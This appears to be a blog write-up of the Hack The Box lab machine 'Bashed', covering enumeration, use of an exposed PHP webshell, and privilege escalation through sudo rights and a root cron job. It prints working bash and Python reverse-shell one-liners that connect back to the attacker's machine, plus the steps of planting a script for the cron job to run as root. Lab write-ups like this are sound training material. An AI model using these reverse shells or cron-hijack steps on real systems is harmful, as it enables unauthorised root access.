---
layout: post
title: "HTB: BASHED (10.10.10.68)"
description: "Bashed is an easy linux box that presents an interesting challenge. It had a webshell already available but you had to do more enumeration just to find the directory. In privilage escalation, I will find a script directory with a cron job running and create a reverse shell which will be executed and give me access as root"
tags: [bash, webshell, gobuster, bashed, htb, hackthebox, nmap, sudo, Linenum, python, cron, crontab, php]
image: "/assets/img/bashed/feature.png"
---
## RECON
### Nmap

As always we start off with the recon and enumeration process to get an overview of our attack surface and target's running service.

```sh
┌─[george@parrot]─[~/HTB/boxes/bashed]
└──╼ $ sudo nmap -p- --min-rate 10000 -oA nmap/allports 10.10.10.68
[sudo] password for george:
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-29 12:15 EAT
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
Warning: 10.10.10.68 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.68
Host is up (3.9s latency).
Not shown: 52986 closed tcp ports (reset), 12548 filtered tcp ports (no-response)
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 303.64 seconds

# Nmap 7.93 scan initiated Tue Jul 25 23:01:27 2023 as: nmap -sC -sV -p80 -oA nmap/bashed 10.10.10.68
Nmap scan report for 10.10.10.68
Host is up (0.51s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jul 25 23:02:06 2023 -- 1 IP address (1 host up) scanned in 38.65 seconds
```

`nmap` finds only one port open `http port 80`

from the [Apache Version](https://bugs.launchpad.net/ubuntu/+source/apache2/2.4.18-2ubuntu3.17) we can say the host is likely ubuntu Xenial

### Port Enumeration

#### Website

The webpage talks about a phpbash which suggestes we will be dealing with a `php` site.

![Website](/assets/img/bashed/http.png)

Most of the links are dead except `DEVELOPMENT` which opens another page `single.html`

![Single](/assets/img/bashed/single.png)

This explains the `phpbash` shell more and also gives two screenshots showing it in action. It also gives a github page to the creator.

![webshell](/assets/img/bashed/uploads.png)

## Shell as www-data

### Directory Bruteforce

I will fire up `gobuster` to bruteforce any directories present on the site.

```sh
┌─[george@parrot]─[~/HTB/boxes/bashed]
└──╼ $ gobuster dir -u http://10.10.10.68/ -w /opt/Seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.68/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /opt/Seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2023/09/29 18:12:56 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 311] [--> http://10.10.10.68/images/]
/uploads              (Status: 301) [Size: 312] [--> http://10.10.10.68/uploads/]
/php                  (Status: 301) [Size: 308] [--> http://10.10.10.68/php/]    
/css                  (Status: 301) [Size: 308] [--> http://10.10.10.68/css/]    
/dev                  (Status: 301) [Size: 308] [--> http://10.10.10.68/dev/]    
/js                   (Status: 301) [Size: 307] [--> http://10.10.10.68/js/]     
/config.php           (Status: 200) [Size: 0]                                    
/fonts                (Status: 301) [Size: 310] [--> http://10.10.10.68/fonts/]  
Progress: 10582 / 441122 (2.40%)                                                ^C
[!] Keyboard interrupt detected, terminating.

===============================================================
2023/09/29 18:19:40 Finished
===============================================================
```
`gobuster` finds a couple of directories, but the most intresting to us is `/dev`

![DEV](/assets/img/bashed/dev.png)

I will click on the `phpbash.php` and it opens a webshell just like the one they demoed on the `single.html` page.

![Webshell](/assets/img/bashed/webshell.png)

I can be able to access anything on the box from this `shell` but I prefera reverse shell

Lets get a foothold on the box and upgrade our shell to a better one using `python`

### reverse shell

I ran into a couple of challenges with this but I found a Workaround.

I will save my rev shell on my box as `shell.sh` then I will download it using the `webshell` and execute it on the box using bash

![Rev shel](/assets/img/bashed/revshell.png)


```sh
┌─[george@parrot]─[~/HTB/boxes/bashed/www]
└──╼ $ sudo python3 -m http.server 80
[sudo] password for george:
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.68 - - [29/Sep/2023 21:45:26] "GET /shell.sh HTTP/1.1" 200 -
10.10.10.68 - - [29/Sep/2023 21:46:25] "GET /shell.sh HTTP/1.1" 200 -
ls
10.10.10.68 - - [29/Sep/2023 22:22:09] "GET /shell.sh HTTP/1.1" 200 -
^C
Keyboard interrupt received, exiting.
┌─[george@parrot]─[~/HTB/boxes/bashed/www]
└──╼ $ cat shell.sh
bash -i >& /dev/tcp/10.10.16.7/9001 0>&1
```
Finally I get access to the box.

```sh
┌─[george@parrot]─[~/HTB/boxes/bashed]
└──╼ $ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.10.68] 33638
bash: cannot set terminal process group (828): Inappropriate ioctl for device
bash: no job control in this shell
www-data@bashed:/dev/shm$ python -c 'import pty;pty.spawn("/bin/bash")'
python -c 'import pty;pty.spawn("/bin/bash")'
www-data@bashed:/dev/shm$ ^Z         
[1]+  Stopped                 nc -lvnp 9001
┌─[✗]─[george@parrot]─[~/HTB/boxes/bashed]
└──╼ $ stty raw -echo;fg
nc -lvnp 9001

www-data@bashed:/dev/shm$
```
Bingo! after getting on the box, I ran `Linenum.sh` which is a linux privilage escalation scrip

It finds An odd Directory called scripts owned by `scriptmanager`

```sh
www-data@bashed:/dev/shm$ cd /
www-data@bashed:/$ ls
bin   etc         lib         media  proc  sbin     sys  var
boot  home        lib64       mnt    root  scripts  tmp  vmlinuz
dev   initrd.img  lost+found  opt    run   srv      usr
www-data@bashed:/$ ls -la
total 92
drwxr-xr-x  23 root          root           4096 Jun  2  2022 .
drwxr-xr-x  23 root          root           4096 Jun  2  2022 ..
-rw-------   1 root          root            174 Jun 14  2022 .bash_history
drwxr-xr-x   2 root          root           4096 Jun  2  2022 bin
drwxr-xr-x   3 root          root           4096 Jun  2  2022 boot
drwxr-xr-x  19 root          root           4140 Sep 29 12:18 dev
drwxr-xr-x  89 root          root           4096 Jun  2  2022 etc
drwxr-xr-x   4 root          root           4096 Dec  4  2017 home
lrwxrwxrwx   1 root          root             32 Dec  4  2017 initrd.img -> boot/initrd.img-4.4.0-62-generic
drwxr-xr-x  19 root          root           4096 Dec  4  2017 lib
drwxr-xr-x   2 root          root           4096 Jun  2  2022 lib64
drwx------   2 root          root          16384 Dec  4  2017 lost+found
drwxr-xr-x   4 root          root           4096 Dec  4  2017 media
drwxr-xr-x   2 root          root           4096 Jun  2  2022 mnt
drwxr-xr-x   2 root          root           4096 Dec  4  2017 opt
dr-xr-xr-x 171 root          root              0 Sep 29 12:18 proc
drwx------   3 root          root           4096 Jun  2  2022 root
drwxr-xr-x  18 root          root            500 Sep 29 12:18 run
drwxr-xr-x   2 root          root           4096 Dec  4  2017 sbin
drwxrwxr--   2 scriptmanager scriptmanager  4096 Jun  2  2022 scripts
drwxr-xr-x   2 root          root           4096 Feb 15  2017 srv
dr-xr-xr-x  13 root          root              0 Sep 29 12:18 sys
drwxrwxrwt  10 root          root           4096 Sep 29 12:35 tmp
drwxr-xr-x  10 root          root           4096 Dec  4  2017 usr
drwxr-xr-x  12 root          root           4096 Jun  2  2022 var
lrwxrwxrwx   1 root          root             29 Dec  4  2017 vmlinuz -> boot/vmlinuz-4.4.0-62-generic
```
It also checks our `sudo privilages` which shows we can get shell as `scriptmanager`.  

```sh
www-data@bashed:/$ sudo -l
Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
```

## Shell as Scriptmanager

Awesome, lets escalate our privilages.

```sh
www-data@bashed:/$ sudo -u scriptmanager /bin/bash
scriptmanager@bashed:/$
```
We can now access the `scripts directory`

```c
scriptmanager@bashed:/scripts$ ls -la
total 16
drwxrwxr--  2 scriptmanager scriptmanager 4096 Jun  2  2022 .
drwxr-xr-x 23 root          root          4096 Jun  2  2022 ..
-rw-r--r--  1 scriptmanager scriptmanager   58 Dec  4  2017 test.py
-rw-r--r--  1 root          root            12 Sep 29 12:44 test.txt

```
## shell as root
### test.py

`test.txt` file is owned by `root` and seems to be the results of the `test.py` script which is owned by `scriptmanager`.

Lets check out the contents of `test.py`

```py
scriptmanager@bashed:/scripts$ cat test.py
f = open("test.txt", "w")
f.write("testing 123!")
f.close
scriptmanager@bashed:/scripts$
```
after a few minutes, I listed the contents of the scripts directory and I noticed the time on `test.txt` changed. Hmm could be a cron job running the `test.py`.

I tried changing the contents of the `test.py` and it still executed

I guess it executes any python file in that folder.

Knowing this, I will create an exploit as below and save it as `shell.py`

```py
echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.16.7\",9002));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);" > shell.py
```
I will start a listener on my attacking machine and set it to port `9002` And if we are right, we should wait a few minutes for a shell to pop up

```sh
┌─[george@parrot]─[~/HTB/boxes/bashed]
└──╼ $ nc -lvnp 9002
listening on [any] 9002 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.10.68] 41966
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
#
```
And we are root :)

### cron

I was curious if its a `cron` that was executing the scripts, so I will list all cron jobs running with `crontab -l`

```
# crontab -l
* * * * * cd /scripts; for f in *.py; do python "$f"; done
#
```
Sure enough there is a cron job entry which runs all Python (.py) scripts located in the "/scripts" directory every minute of every day. It's a way to automate the execution of these scripts on a regular basis.


And thats the box. Thank you all for taking your time to read my blog post, stay tuned for the next!
Happy hacking!
